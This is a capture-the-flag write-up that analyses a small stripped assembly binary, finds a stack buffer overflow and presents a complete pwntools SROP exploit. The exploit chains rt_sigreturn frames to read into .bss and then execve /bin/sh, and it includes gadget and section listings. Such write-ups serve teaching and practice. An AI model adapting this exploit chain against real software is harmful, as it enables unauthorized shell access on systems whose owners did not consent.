# [MEDIUM] PWN - My First ASM

## Overview
This binary is written in pure Assembly. It contains a large buffer overflow vulnerability. The stack is not executable, meaning shellcode cannot be executed by default.
There is a limited number of usable gadgets in the binary. The intended solution is to use **SROP** (**Sigreturn Oriented Programming**) to exploit the binary.
It is written in a way to limit the number of usable gadgets to two `pop rax; ret;` and `syscall` gadgets.

*(There are multiple ways to exploit this binary using the SROP technique. I will only present the one SROP exploit I have written.)*

## Initial Analysis
The binary is incredibly small and is stripped of its symbols.

```
fcn.00401000();
	0x00401000      mov     edi, 0     ; [00] -r-x section size 49 named .text
	0x00401005      mov     edx, 0x3e8 ; 1000
	0x0040100a      push    0
	0x0040100c      pop     rax
	0x0040100d      ret

int main(int argc, char **argv, char **envp);
	0x0040100e      call    fcn.00401000 ; fcn.00401000
	0x00401013      mov     rsi, rsp
	0x00401016      sub     rsi, 0xc8  ; 200
	0x0040101d      syscall
	0x0040101f      ret

entry0(int argc, char **argv, char **envp);
	; arg int argc @ rdi
	; arg char **argv @ rsi
	; arg char **envp @ rdx
	0x00401020      call    main       ; int main(int argc, char **argv, char **envp)
	0x00401025      mov     eax, 0x3c  ; '<' ; 60
	0x0040102a      mov     edi, 0
	0x0040102f      syscall
```

### entry0()
```
0x00401020      call    main       	<--- Call the main() function
0x00401025      mov     eax, 0x3c  	<--- Move 0x3c (60) (syscall number for exit) into EAX
0x0040102a      mov     edi, 0		<--- Move 0 into EDI
0x0040102f      syscall				<--- Execute the exit syscall
```

### main()
```
0x0040100e      call    fcn.00401000	<--- Call the fcn.00401000 function
0x00401013      mov     rsi, rsp		<--- Move the value of RSP into RSI
0x00401016      sub     rsi, 0xc8  		<--- Subtract 0xc8 (200) from RSI (Create a 200 byte buffer on the stack)
0x0040101d      syscall					<--- Execute a syscall
0x0040101f      ret						<--- Return from the main() function
```

### fcn.00401000()
```
0x00401000      mov     edi, 0     	<--- Move 0 into EDI	
0x00401005      mov     edx, 0x3e8	<--- Move 0x3e8 (1000) into EDX
0x0040100a      push    0			<--- Push 0 onto the stack
0x0040100c      pop     rax			<--- Pop the top value from the stack (0) into RAX
0x0040100d      ret					<--- Return from the fcn.00401000() function back to main()
```

The `fcn.00401000()` function is called by the `main()` function and is used to setup the registers for the next **syscall**.

The RAX register will contain the value 0, which is the syscall number for **read**.
The RDI (EDI) register will contain the value 0, which is the file descriptor for **stdin**.
The RDX (EDX) register will contain the value 0x3e8 (1000), which is the number of bytes to read from **stdin**.

This is an obvious buffer overflow vulnerability, it could also be found by manual fuzzing of the running binary.

## Exploitation
Because the value of **RSP** is moved into **RSI** before 0xc8 (200) is subtracted from **RSI**, the offset before overwriting **RSP** is 200. 

### Find gadgets in the binary
```
$ ROPgadget --binary ./chall 
Gadgets information
============================================================
0x000000000040102b : add byte ptr [rax], al ; add byte ptr [rax], al ; syscall
0x0000000000401027 : add byte ptr [rax], al ; add byte ptr [rdi], bh ; syscall
0x0000000000401028 : add byte ptr [rax], al ; mov edi, 0 ; syscall
0x0000000000401008 : add byte ptr [rax], al ; push 0 ; pop rax ; ret
0x000000000040101b : add byte ptr [rax], al ; syscall
0x0000000000401029 : add byte ptr [rdi], bh ; syscall
0x0000000000401004 : add byte ptr [rdx + 0x3e8], bh ; push 0 ; pop rax ; ret
0x0000000000401009 : add byte ptr [rdx], ch ; pop rax ; ret
0x0000000000401007 : add eax, dword ptr [rax] ; add byte ptr [rdx], ch ; pop rax ; ret
0x0000000000401026 : cmp al, 0 ; add byte ptr [rax], al ; mov edi, 0 ; syscall
0x0000000000401019 : enter 0, 0 ; syscall
0x0000000000401021 : jmp 0xffffffffb9401025
0x000000000040102a : mov edi, 0 ; syscall
0x0000000000401005 : mov edx, 0x3e8 ; push 0 ; pop rax ; ret
0x0000000000401014 : mov esi, esp ; sub rsi, 0xc8 ; syscall
0x0000000000401015 : out 0x48, al ; sub esi, 0xc8 ; syscall
0x0000000000401018 : out dx, al ; enter 0, 0 ; syscall
0x000000000040100c : pop rax ; ret
0x000000000040100a : push 0 ; pop rax ; ret
0x000000000040100d : ret
0x0000000000401017 : sub esi, 0xc8 ; syscall
0x0000000000401016 : sub rsi, 0xc8 ; syscall
0x000000000040101d : syscall

Unique gadgets found: 23
```

### Find writable locations in the binary
```
$ readelf -S ./chall -W
There are 4 section headers, starting at offset 0x1048:

Section Headers:
  [Nr] Name              Type            Address          Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            0000000000000000 000000 000000 00      0   0  0
  [ 1] .text             PROGBITS        0000000000401000 001000 000031 00  AX  0   0 16
  [ 2] .bss              NOBITS          0000000000402000 002000 0001f8 00  WA  0   0  4	<--- Writable 504 byte location
  [ 3] .shstrtab         STRTAB          0000000000000000 001031 000016 00      0   0  1
```

## Exploit
For my exploit, I chose to perform the following actions:
	- Build a **sigreturn** frame that calls the `read` syscall to write input into the `.bss` section.
	- Overflow the buffer and overwrite **RSP** with the address of the `pop rax; ret;` gadget.
	- Write **15** into RAX and then return to the `syscall` gadget to execute the **rt_sigreturn** syscall.
	- Write the *read* sigreturn frame onto the stack to execute `read` once the syscall returns.
	- Build a second **sigreturn** frame to execute `execve` pointing to the `"/bin/sh\x00"` string written into `.bss` by the `read` syscall.
	- Use the `read` syscall to write the string `"/bin/sh\x00"` into `.bss` followed by the `pop rax; ret;`, `15`, `syscall`, and *execve* sigreturn frame.
	- After the `read` syscall, the **RSP** will be pointing to the second **SROP** chain in `.bss` and will then execute `execve`.

```
#!/usr/bin/env python3

from pwn import *
from time import sleep

# Set the binary context to the local binary
context.binary = binary = ELF("./chall", checksec=False)
context.log_level = "INFO"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

# Exploitation code
offset = 200							# Offset before overwriting RSP
buffer = b"A"*offset					# Junk to send to overflow the buffer up until RSP

bss_address = 0x0000000000402000		# Address of writable section .bss
pop_rax_ret = p64(0x000000000040100c)	# Address of 'pop rax; ret;' gadget
syscall = 0x000000000040101d			# Address of 'syscall' gadget

# Build SigreturnFrame for the read syscall
read_frame = SigreturnFrame()
read_frame.rax = 0						# Syscall number for 'read'
read_frame.rdi = 0						# fd for stdin
read_frame.rsi = bss_address			# Location to write to
read_frame.rdx = 400					# Number of bytes to write
read_frame.rip = syscall				# Set RIP to the address of the 'syscall' gadget
read_frame.rsp = bss_address + 0x8		# After the syscall is executed, RSP should point to the next ROP chain (pop rax; ret;...)

# Build the SigreturnFrame for the execve syscall
execve_frame = SigreturnFrame()
execve_frame.rax = 59					# Syscall number for 'execve'
execve_frame.rdi = bss_address			# Address of the binary to execute ('/bin/sh\x00')
execve_frame.rsi = 0					# *argv = NULL
execve_frame.rdx = 0					# *envp = NULL
execve_frame.rip = syscall				# Set RIP to the address of the 'syscall' gadget

# First ROP chain
buffer += pop_rax_ret					# Address of 'pop rax; ret;' gadget
buffer += p64(15)						# Pop 0xf (15) into RAX (rt_sigreturn syscall number)
buffer += p64(syscall)					# Execute the syscall (rt_sigreturn)
buffer += bytes(read_frame)				# Push the 'read' syscall register values onto the stack

# Second ROP chain to write to .bss
write = b"/bin/sh\x00"					# Write '/bin/sh\x00' at the start of .bss
write += pop_rax_ret					# Address of the 'pop rax; ret;' gadget
write += p64(15)						# Pop 0xf (15) into RAX (rt_sigreturn syscall number)
write += p64(syscall)					# Execute the syscall (rt_sigreturn)
write += bytes(execve_frame)			# Push the 'execve' syscall register values onto the stack

# Start connection (LOCAL, REMOTE, or GDB)
p = start()

p.sendline(buffer)						# Send the original buffer overflow and 'read' syscall SROP chain
sleep(0.5)								# Sleep for 0.5 seconds to account for the 'read' syscall setup and network stability issues
p.send(write)							# Send the '/bin/sh\x00' string + second SROP chain to write into .bss
p.interactive()							# Interact with the spawned shell

# Close connection
p.close()
```

- Run locally with: `python3 exploit.py`
- Run on the remote instance with: `python3 exploit.py REMOTE HOST=<IP> PORT=<PORT>`
